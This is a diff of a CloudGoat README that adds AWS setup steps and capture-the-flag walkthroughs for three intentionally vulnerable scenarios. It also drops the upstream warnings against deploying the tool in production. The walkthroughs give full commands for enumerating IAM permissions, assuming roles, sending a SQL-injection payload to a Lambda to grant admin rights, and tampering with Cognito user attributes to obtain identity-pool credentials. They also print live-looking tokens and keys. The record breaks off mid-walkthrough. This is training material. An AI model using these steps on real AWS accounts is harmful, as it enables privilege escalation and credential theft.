@@ -22,20 +22,6 @@ _CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool._
 
 CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool. It allows you to hone your cloud cybersecurity skills by creating and completing several "capture-the-flag" style scenarios. Each scenario is composed of AWS resources arranged together to create a structured learning experience. Some scenarios are easy, some are hard, and many offer multiple paths to victory. As the attacker, it is your mission to explore the environment, identify vulnerabilities, and exploit your way to the scenario's goal(s).
 
-Below are our main goals for CloudGoat:
-
-* **Focused, Curated, High-Quality Learning Experiences** - Each of CloudGoat’s scenarios should provide the opportunity for experimentation, exploration, and building hands-on cloud security skills.
-* **Good Documentation** - We've done our best to ensure that CloudGoat’s scenarios are well-documented and easy to understand and evaluate in terms of difficulty, content, structure, and skills-required.
-* **Easy to Install and Use** - We understand that CloudGoat is a means to an end - learning and practicing cloud security penetration testing. Therefore, we aim to keep things simple, straightforward, and reliable.
-* **Modularity** - Each scenario is a standalone learning environment with a clear goal (or set of goals), and CloudGoat is able to start up, reset, or shut down each scenario independently.
-* **Expandability** - CloudGoat’s core components (python app and scenarios) are designed to permit easy and independent expansion - by us or the community.
-
-Before you proceed, please take note of these warnings!
-
-> **Warning #1:** CloudGoat creates intentionally vulnerable AWS resources into your account. DO NOT deploy CloudGoat in a production environment or alongside any sensitive AWS resources.
-
-> **Warning #2:** CloudGoat can only manage resources it creates. If you create any resources yourself in the course of a scenario, you should remove them manually before running the `destroy` command.
-
 ## Requirements
 
 * Linux or MacOS. Windows is not officially supported.
@@ -45,327 +31,576 @@ Before you proceed, please take note of these warnings!
 * The AWS CLI [installed and in your $PATH](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html), and an AWS account with sufficient privileges to create and destroy resources.
 * [jq](https://stedolan.github.io/jq/)
 
+## Optional Requirements
+* PACU 
+   ```
+   mkdir pacu && cd pacu
+   python3 -m venv venv && source venv/bin/activate
+   ```
+
 ## Quick Start
 
-To install CloudGoat, make sure your system meets the requirements above, and then run the following commands:
+### Setup Free-tier AWS Account
+1. Navigate to the AWS Console sign-up page: AWS Console - Signup (amazon.com) 
+2. Add an email address and account name, then click the "Verify email address" button. 
+3. Enter the verification code that was sent to your email, then click the "Verify" button. 
+4. On the next page, set your "Root user password" - make sure this is a strong and complex password - then click "Continue". 
+5. Fill out your contact information, and mark that you are using AWS for "Personal" projects. 
+6. Fill out your billing information on the next page. Almost all the CloudGoat scenarios can be completed for free, but providing billing information is required to set up an AWS account. Click "Verify and Continue" when finished. 
+7. For the support plan, you can sign up for "Basic support" as that is completely free. 
+8. Finally, click the "Complete sign up" button and log into your new AWS account!  
 
-```
-git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
-cd cloudgoat
-python3 -m venv .venv
-source .venv/bin/activate
-pip3 install -r ./requirements.txt
-chmod +x cloudgoat.py
-```
-You may also want to run some quick configuration commands - it'll save you some time later:
-```
-$ ./cloudgoat.py config profile
-$ ./cloudgoat.py config whitelist --auto
-```
-Now, at your command, CloudGoat can `create` an instance of a scenario in the cloud. When the environment is ready, a new folder will be created in the project base directory named after the scenario and with a unique scenario ID appended. Inside this folder will be a file called `start.txt`, which will contain all of the resources you'll need to begin the scenario, though these are also printed to your console when the `create` command completes. Sometimes an SSH keypair named `cloudgoat`/`cloudgoat.pub` will be created as well.
 
-> **Note:** Don't delete or modify the scenario instance folder or the files inside, as this could prevent CloudGoat from being able to manage your scenario's resources.
+### Configure IAM
+1. Navigate to the IAM Management Console: IAM Management Console (amazon.com)
+2. Click "Users" on the left side under "Access management". 
+Click the "Add Users" button in the top right of the page. 
+3. Set your "User name" - this can be any unique value - and click "Next". 
+4. Make sure "Add user to group" is selected and then click "Create group." 
+5. For the "User group name", this can be any value. We recommend user "Administrator" so that it's clear the permissions the group has. 
+6. Mark the "AdminstratorAccess" policy name and click "Create user group". 
+7. Make sure you select the "administrator" group you just created and click the "Next" button. 
+8. Finally, click the "Create user" button on the bottom of the page. 
 
-As you work through the scenario, feel free to refer to the scenario's readme if you need direction. If you get stuck, there are cheat sheets linked at the bottom of each route's walkthrough.
+### Create AWS Access Key
+1. Click on the user you created in the previous task. 
+2. Click "Security Credentials" tab for the user. 
+3. Scroll down to "Access keys" and then click "Create access key". 
+4. Select "Command Line Interface (CLI)" and click the "Next" button. You may be prompted with alternatives, just mark that you understand and continue the process. 
+5. On the "Description tag value", this can be anything you want. I would recommend tagging it with "cloudgoat". Click "Create access key". 
+6. Copy the "Access key" and "Secret access key". This is the only time you will be able to retrieve the secret access key. Do not leave this page until you have copied this information. 
 
-When you are finished with the scenario, delete any resources you created yourself (remember: CloudGoat can only manage resources it creates) and then run the `destroy` command. It's always a good idea to take a quick glance at your AWS web-console afterwards - just in case something didn't get deleted.
+### Install Terraform
 
-You can read the full documentation for CloudGoat's commands [here in the Usage Guide section](#usage-guide).
+1. Download the Terraform Binary for Kali Linux: [Terraform_1.5.0_Linux](https://releases.hashicorp.com/terraform/1.5.0/terraform_1.5.0_linux_amd64.zip)  
+Unzip the package.
+2. Type this command: sudo mv terraform /usr/local/bin
+Verify Terraform is installed by typing: ```terraform --version``` 
 
-## How to use CloudGoat's Docker image
+### Install AWS CLI
+1. Copy these commands into your terminal:
+   ```
+   curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+   unzip awscliv2.zip
+   sudo ./aws/install
+   ```
+2. Verify AWS CLI is installed by typing: `aws --version`
 
-[![Try in PWD](https://github.com/play-with-docker/stacks/raw/cff22438cb4195ace27f9b15784bbb497047afa7/assets/images/button.png)](http://play-with-docker.com?stack=https://raw.githubusercontent.com/RhinoSecurityLabs/cloudgoat/master/docker_stack.yml)
 
-### Option 1: Run with default entrypoint
-```console
-$ docker run -it rhinosecuritylabs/cloudgoat:latest
-```
+### Install CloudGoat
+1. To install CloudGoat, make sure your system meets the requirements above, and then run the following commands:
 
-### Option 2: Run with AWS config and credentials
+   ```
+   git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
+   cd cloudgoat
+   pip3 install -r ./requirements.txt
+   chmod +x cloudgoat.py
+   ```
+2. Configure your profile with the following command. When prompted, type "cloudgoat" as the profile name. 
+`./cloudgoat.py config profile`
 
-> Warning: Running this command will mount your local AWS configuration files into the Docker container when it is launched. This means that any user with access to the container will have access to your host computer's AWS credentials.
+3. Whitelist IP for scenarios 
+`$ ./cloudgoat.py config whitelist --auto`
 
-```console
-$ docker run -it -v ~/.aws:/root/.aws/ rhinosecuritylabs/cloudgoat:latest
-```
 
-## Scenarios Available
+## Scenarios Tackled
 
 ### sns_secrets (Small / Easy) 
-`$ ./cloudgoat.py create sns_secrets`
-
 In this scenario, you start with basic access to an AWS account. You need to enumerate your privileges, discover an SNS Topic you can subscribe to, retrieve a leaked API Key, and finally use the API Key to access an API Gateway for the final flag.  
 
 [Visit Scenario Page.](scenarios/sns_secrets/README.md) 
 
 Contributed by [Tyler Ramsbey.](https://youtube.com/@TylerRamsbey)
+#### Setup Scenario
+1. Run the following command
+`$ ./cloudgoat.py create sns_secrets`
+
+2. Configure AWS profile `aws configure --profile sns-secrets`
+   Enter the access key and secret key given when creating scenario. You may leave region name and output format as empty.
+   ![Configure Profile](images/sns_secrets/image1.png)
+
+3. Run this command to verify if profile has been setup (akin to whoami) `aws sts get-caller-identity --profile sns-secrets`
+
+   Result:
+   ![whoami](images/sns_secrets/image2.png)
+
+#### Walkthrough
+1. Start by enumerating the policies that sns_secrets hold
+`aws iam list-user-policies --username cg-sns-user-sns_secrets_cgidomg0yotdx7 --profile sns-secrets`
+Result:
+![Enumerate Policy](images/sns_secrets/image3.png)
+
+2. Notice there's one policy attached to user. Let's enumerate the functions of the policy
+`aws iam get-user-policy --user-name cg-sns-user-sns_secrets_cgidomg0yotdx7 --policy-name cg-sns-user-sns_secrets_cgidomg0yotdx7 --profile sns-secrets`
+Result: 
+![Policy Function](images/sns_secrets/image4.png)
+Scrolling down, we can see the functions that the policy holds
+![Functions](images/sns_secrets/image5.png)
+
+3. Let's breakdown the actions. SNS is similiar to [GCP pub/sub topic](https://cloud.google.com/pubsub/docs/create-topic). As such, we know the actions user can subscribe, receive and list topics. Using PACU, it can help automate the enumeration process.
+`pacu`
+
+4. Import current keys config into PACU
+`import_keys sns-secrets`
+
+5. Enumerate SNS actions `search sns`
+   Result:
+   ![Enum sns](images/sns_secrets/image7.png)
+
+6. Subscribe to all SNS topic
+`run sns__subscribe --all --email <redacted>`
+
+7. A confirmation email will be sent
+![confirmation email](images/sns_secrets/image15.png)
+Another email containing API Gateway Key will be sent in another minute 
+![gateway key](images/sns_secrets/image16.png)
+
+8. Enumerate API gateways. Only 1 will be shown
+`aws apigateway get-rest-apis --profile sns-secrets --region us-east-1`
+Result: 
+![api gateway](images/sns_secrets/image12.png)
+
+9. Probe further to obtain stage name and path
+Obtain stage name:
+`aws apigateway get-stages --rest-api-id 40ga6hov93 --profile sns-secrets --region us-east-1`
+Result:
+![stage name](images/sns_secrets/image17.png)
+Obtain path:
+`aws apigateway get-resources --rest-api-id 40ga6hov93 --profile sns-secrets --region us-east-1`
+Result
+![path](images/sns_secrets/image18.png)
+
+10. Now that we have API key and path, let's query it using CURL. We can use this format from [AWS documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html)
+`https://<api-id>.execute-api.region.amazonaws.com/<stage>/<pathname>`
+As such, we can query the information
+`curl -X GET 'https://40ga6hov93.execute-api.us-east-1.amazonaws.com/prod-sns_secrets_cgidomg0yotdx7/user-data' -H 'x-api-key: 45a3da610dc64703b10e273a4db135bf' | json_pp`
+Result: 
+![flag](images/sns_secrets/image14.png)
+
+#### Root causes
+- Insufficient access control: User may not have access to subscribe to topic
+- Sensitive items in LOG: API gateway key is found in debug pub/sub topic
 
 ### vulnerable_lambda (Small / Easy)
-
-`$ ./cloudgoat.py create vulnerable_lambda`
-
 In this scenario, you start as the 'bilbo' user. You will assume a role with more privileges, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privelages of the bilbo user in order to search for secrets. 
 
 [Visit Scenario Page.](scenarios/vulnerable_lambda/README.md)
 
+#### Setup Scenario
+1. Run the following command
+`$ ./cloudgoat.py create vulnerable_lambda`
+
+2. Configure AWS profile `aws configure --profile bilbo`
+   Enter the access key and secret key given when creating scenario. You may leave region name and output format as empty.
+
+3. Run this command to verify if profile has been setup (akin to whoami) `aaws --profile bilbo --region us-east-1 sts get-caller-identity`
+
+   Result:
+   ![whoami](images/vulnerable_lambda/image1.png)
+
+#### Walkthrough
+1. Enumerate policy attached to user `aws --profile bilbo --region us-east-1 iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e`
+Result:
+![list policy](images/vulnerable_lambda/image2.png)
+
+2. Check functions of the policy `aws --profile bilbo --region us-east-1 iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e --
+policy-name cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e-standard-user-assumer
+`
+Notice that user can list and roles.
+![policy actions](images/vulnerable_lambda/image3.png)
+
+3. List all available roles `aws --profile bilbo --region us-east-1 iam list-roles`
+Result: 
+![all roles](images/vulnerable_lambda/image1.png)
+
+4. List role policy for role **cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e**
+`aws --profile bilbo --region us-east-1 iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e`
+Result
+Notice a policy name: **lambda invoker** is attached to role **cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e**
+![list role policy](images/vulnerable_lambda/image5.png)
+
+5. Assume role **cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e**
+   ```
+   aws --profile bilbo --region us-east-1 sts assume-role --role-arn arn:aws:iam::536697256593:role/cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e --role-session-name cloudgoat
+   ```
+Result
+![assume role](images/vulnerable_lambda/image6.png)
+
+6. Configure a new profile for the newly obtained **AccessKey**, **SecretAccessKey** and **SessionToken**.
+``aws configure --profile cloudgoat``
+![configure new profile](images/vulnerable_lambda/image7.png)
+Set session token into new profile
+   ```
+   aws configure set aws_session_token FwoGZXIvYXdzEAUaDIZ8UAGCT1uyPQrryyKtATsy66OE5lvcQIGoWYBcixUTqEIOloqB85T/0xkTlN0CATw7F7guD2Yy+Sc9R/acrKVs1H64MEuWLgGu/rpEnIPWzZZrQ2aArKumQM9KX+z81cYfvUbUyL1aaE3yiGN+nAIM/aPTn6OMHzwjigjAcKTb0K7Lif6+F525fWqeem0aOL9kbjP3fG/SMCBV+fgyTIim5vrdWlJqkTq/+qv9hAXcSNkou0S2D7dzVA9zKJjeyLwGMi3VJmPe39D0mskfEKIwEdjmMiRXgRLDFr4G6PA5yWv2vyq7Dt4MZNOzD5cGQIw= --profile cloudgoat
+   ```
+
+7. Using the new profile, list all functions
+`aws --profile cloudgoat --region us-east-1 lambda list-functions`
+Result:
+![list function](images/vulnerable_lambda/image8.png)
+
+8. Check function description. Notice that function communicate with database.
+![Function description](images/vulnerable_lambda/image9.png)
+Scrolling down, notice that there's a URL to download the function source code.
+![Function source code](images/vulnerable_lambda/image10.png)
+
+9. Download source code and rename it to a zip file format.
+   ```
+   #Download source code
+   wget "https://prod-iad-c1-djusa-tasks.s3.us-east-1.amazonaws.com/snapshots/536697256593/vulnerable_lambda_cgid1a3yt0x76e-policy_applier_lambd
+   a1-cc95b95d-26d0-4a96-8dde-b834e3cbbece?versionId=osghzlAUdDyANBSf.xi2F6o23dMrboVJ&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIESe0NfIpE2j6nAXdybtERrupc2tUEbc
+   PlREX0zQtwLpAiEAg4%2F%2FdnosFZHrYgn%2FfSrZOvjyVYot5bDatQnCDLrejh8qkgII4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAEGgw0NzkyMzMwMjUzNzkiDNXrg5bf6znOgtbtxyrmAXwrSYoEQxFy8fDLbrmuK%2B3Bp0RPdumqZBh8tVM3kRg6kBU%2FsWBgU2M3
+   OF4CZoPCauDhTtIa70zDPb2iIUg4ej4%2BgbfmoWtUXy6zA%2BMcxvA0X5R%2B3RbwWqhrFYGtghaJqnNcZIrgh3p4Z%2Bj38llGDElAucl%2BvN34e%2FrIN%2FS54gxhzASie9wnchbqSaTy1hKG6kNjUXVS5yHTtPcx251YBaxUGAdiG%2BuX3DRGXfzN1%2BwQTwoiKro4Bg
+   ovVdPZSsSeOxm2SXBuFxyIFCqkUF4JXCIigsN8VwzK0DSzsMRAo4kVpfP37RA%2BMNXIxrwGOo8B6rzOG4lDCkjVQs%2BTwthgThgcel81BSOzk%2Bb21od1gxe5sLSMk5qzRjIT3S2FdyhSqF7vL1mQPqElEZGmot3fIob7qn23n7b9%2F0OLcZ3iiF%2F0FoFReRZ83vRdciqY
+   5Xa4cXX52sHXxkzQuWdgA7VU519SpeMJANt%2Fg4eS7d%2BvqzTc3thJldnoM8dKGZXCyfo%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250123T123530Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAW7FEDUVR
+   V7KFUM6G%2F20250123%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=b745aca9e763dcde66f58e274e4f3d59a6b0a581821814e28107e52ee08f4e2e"
+
+   #Rename to zip file format
+   mv vulnerable_lambda_cgid1a3yt0x76e-policy_applier_lambda1-cc95b95d-26d0-4a96-8dde-b834e3cbbece\?versionId\=osghzlAUdDyANBSf.xi2F6o23dMrboVJ\
+   &X-Amz-Security-Token\=IQoJb3JpZ2luX2VjEOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIESe0Nf "function.zip"
+   ```
+
+10. Unzip the file `unzip function.zip -d ./function`
+Let's break down the source code.
+- To gain administrator access, **public** needs to be false
+![soure code 1](images/vulnerable_lambda/image11.png)
+- Unsafe sink for SQL injection is found. By injecting SQL payload here will negate **public='True'**
+![source code 2](images/vulnerable_lambda/image12.png)
+- The structure of the payload is as such
+![source code 3](images/vulnerable_lambda/image13.png)
+
+11. With all the information given, we can craft a SQL payload to grant bilbo administrator access. Create a .json file name **payload.json** and insert the following contents. 
+      ```
+      {
+            "policy_names": ["AdministratorAccess'--"],
+            "user_name": ["cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e"]
+      }
+      ```
+
+12. Send the payload as such
+      ```
+      #Send the payload, write result in out.txt
+      aws --profile cloudgoat --region us-east-1 lambda invoke --function-name vulnerable_lambda_cgid1a3yt0x76e-policy_applier_lambda1 --payload file://./payload.json out.txt
+
+      #Read output content
+      cat out.txt
+      ```
+   Result
+   ![payload](images/vulnerable_lambda/image15.png)
+
+13. List secret and get flag
+      ```
+      aws --profile bilbo --region us-east-1 secretsmanager list-secrets
+      ```
+      Flag is at the of the username
+      ![flag](images/vulnerable_lambda/image16.png)
+#### Root Cause
+- Source code was accessible 
+- Did not sanitise user input or use any prepared statements
+
+
 ### vulnerable_cognito (Small / Moderate)
-
-`$ ./cloudgoat.py create vulnerable_cognito`
-
 In this scenario, you are presented with a signup and login page with AWS Cognito in the backend. You need to bypass restrictions and exploit misconfigurations in Amazon Cognito in order to elevate your privileges and get Cognito Identity Pool credentials.
 
 Contributed by [TrustOnCloud.](https://trustoncloud.com/)
 
 [Visit Scenario Page.](scenarios/vulnerable_cognito/README.md)
+#### Setup Scenario
+1. Run the following command
+`$ ./cloudgoat.py create vulnerable_cognito`
+
+2. A webpage should be given and accessible
+
+#### Walkthrough
+1. Enumerating through the site, there are 2 pages - login and signup page. 
+![signup](images/vulnerable_cognito/image1.png)
+An error message will surface during a sign up as such.
+![](images/vulnerable_cognito/image2.png)
+
+2. Dig a little into the source code and you'll find some useful information as such.
+![](images/vulnerable_cognito/image3.png)
+![](images/vulnerable_cognito/image4.png)
+
+3. Now that enumeration is done, let's sign up using AWS-CLI cognito rather than using a web interface. Using the command below will trigger a 2FA to email.
+   ```
+   aws cognito-idp sign-up --client-id 28ppp8lsd8tr0ariq2bg3u2onq --region us-east-1 --username zovytemu@teleg.eu --password Password123! --user-attributes '[{"Name":"given_name
+   ","Value":"test01"},{"Name":"family_name","Value":"test01"}]'
+   ```
+   Confirmation code sent after signing up
+   ![](images/vulnerable_cognito/image6.png)
+
+4. Obtain the 2FA from email and send confirmation
+   ```
+   aws cognito-idp confirm-sign-up --region us-east-1 --client-id 28ppp8lsd8tr0ariq2bg3u2onq --username  zovytemu@teleg.eu --confirmation-code 761005
+   ```
+
+5. Once sign up is complete, login with your new credentials
+![](images/vulnerable_cognito/image7.png)
+
+6. Login success! However, you do not have admin access. There are no other paths in the web application.
+![](images/vulnerable_cognito/image8.png)
+Looking into localstorage, you will find a access code. This is issued to user upon login. Using the same access code, we can get user attributes
+   ```
+   aws cognito-idp get-user --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --region us-east-1
+   ```
+   Result: 
+   ![](images/vulnerable_cognito/image9.png)
+
+   Using JWT decode:
+   ![](images/vulnerable_cognito/image10.png)
+
+7. Referencing from [AWS-CLI Cognito documentation](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-attributes.html), update custom attribute **custom:access** to **admin**
+   ```
+   aws cognito-idp update-user-attributes --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --user-attributes '[{"Name":"custom:access","Value":"admin"}]' --region us-east-1
+   ```
+
+8. Check on user and notice that the custom attribute tag has been updated to admin.
+   ```
+   aws cognito-idp get-user --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --region us-east-1
+   ```
+   Result:
+   ![](images/vulnerable_cognito/image13.png)
+
+9. Relogging in will grant user admin access.
+![](images/vulnerable_cognito/image14.png)
+
+10. View source page get **IdentityPoolId**
+![](images/vulnerable_cognito/image15.png)
+
+11. Using new information, get identity id as such
+   ```
+   #Format
+   aws cognito-identity get-id --region us-east-1 --identity-pool-id <IdentityPoolId> --logins "cognito-idp.<Region>.amazonaws.com/<UserPoolId>=<JWT>"
+
+   #Actual Command
+   aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:e0779a64-39ab-4de3-8347-567bd4fe7e30 --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_qVmR5N4kh=eyJraWQiOiJmZkpqYXNrcGIxNDRRN2RZVlVzTk9SSkFSWmFNZDVXa3VnWDB6bTQyaUVvPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfcVZtUjVONGtoIiwiY29nbml0bzp1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSIsImdpdmVuX25hbWUiOiJ0ZXN0MDEiLCJjdXN0b206YWNjZXNzIjoiYWRtaW4iLCJvcmlnaW5fanRpIjoiNGFiMWExNTAtMGRmNC00MTRhLWI5MWMtYWU0N2MyYmZjMTUzIiwiYXVkIjoiMjhwcHA4bHNkOHRyMGFyaXEyYmczdTJvbnEiLCJldmVudF9pZCI6IjVhYjdlYmIyLWNhMzItNGM4Zi04YTAzLTQyZDU5ODJmYzIwYyIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzM3NjQ0NDg3LCJleHAiOjE3Mzc2NDgwODcsImlhdCI6MTczNzY0NDQ4NywiZmFtaWx5X25hbWUiOiJ0ZXN0MDEiLCJqdGkiOiJmNTliYjVmYS00MDIwLTQyYzEtYjA4ZS00MDQ4NTA0ODBhNzMiLCJlbWFpbCI6Inpvdnl0ZW11QHRlbGVnLmV1In0.hgGGTqrCBhyU0a1-FTP2wh4ARXx2iQSlUhLWzsy-xDqrWvGfhKfJAVlcy2ICP_ys9u14A2r-LGDZu65I0WlYxIHSh3apilgUGeol4NhB2YmtczCiyc1JD_7aOPJiCn5WNnnLpGxy_5jQBb5Ahbyg1Y0RWjt1AZYsx9tJXS1sig_-kpJL0A24fpkG9pKOyymivXZ2wuBM06fO9C4nxpgKeFjxtri_vk3j12d1W9jvg0ydFkXpFrJDSCfztD2Gisd18H3MDLpQsLkCYRUsOzpWDoyUT9S-SMIq1RInIr9vB6CKsvob5Mh-53UJ8we7jBqRaFoghN4cBZZFm-6o0nLItQ"
+   ```
+   Result:
+   ![](images/vulnerable_cognito/image17.png)
+
+12. With identity ID, we can obtain credentials as such
+   ```
+   # Format
+   aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id <IdentityId> --logins "cognito-idp.<Region>.amazonaws.com/<UserPoolId>=<JWT>"
+
+   # Actual Command
